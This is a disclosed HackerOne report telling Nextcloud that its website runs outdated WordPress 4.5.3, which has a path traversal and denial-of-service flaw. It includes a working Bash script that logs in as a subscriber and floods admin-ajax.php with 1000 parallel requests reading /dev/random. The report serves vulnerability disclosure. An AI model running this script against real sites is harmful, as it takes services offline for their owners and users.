---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '163421'
original_report_id: '163421'
title: 'Wordpress: Directory Traversal / Denial of Serivce'
weakness: Information Disclosure
team_handle: nextcloud
created_at: '2016-08-25T20:02:55.338Z'
disclosed_at: '2016-08-26T08:52:53.883Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- information-disclosure
---

# Wordpress: Directory Traversal / Denial of Serivce

## Metadata

- HackerOne Report ID: 163421
- Weakness: Information Disclosure
- Program: nextcloud
- Disclosed At: 2016-08-26T08:52:53.883Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello Security team,
While testing nextcloud.com i have found that you are not using the lastest version of wordpress you are using old version 4.5.3 which is vulnerable to Directory Traversal / Denial of Serivce

Description :

A path traversal vulnerability was found in the Core Ajax handlers of the WordPress Admin API. This issue can be used by an Subscriber to create a denial of service.

POC

The following Bash script can be used to exploit this vulnerability
```
#!/bin/bash
target="https://nextcloud.com"
username="subscriber"
password="password"
cookiejar=$(mktemp)

# login
curl --cookie-jar "$cookiejar" \
   --data "log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1" \
   "$target/wp-login.php" \
   >/dev/null 2>&1

# exhaust apache
for i in `seq 1 1000`
   do
      curl --cookie "$cookiejar" \
      --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" \
      "$target/wp-admin/admin-ajax.php" \
      >/dev/null 2>&1 &
done

rm "$cookiejar"
```
### FIX :

Upgrade your wordpress to 4.6

More details about vulnerability : `https://sumofpwn.nl/advisory/2016/path_traversal_vulnerability_in_wordpress_core_ajax_handlers.html`

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
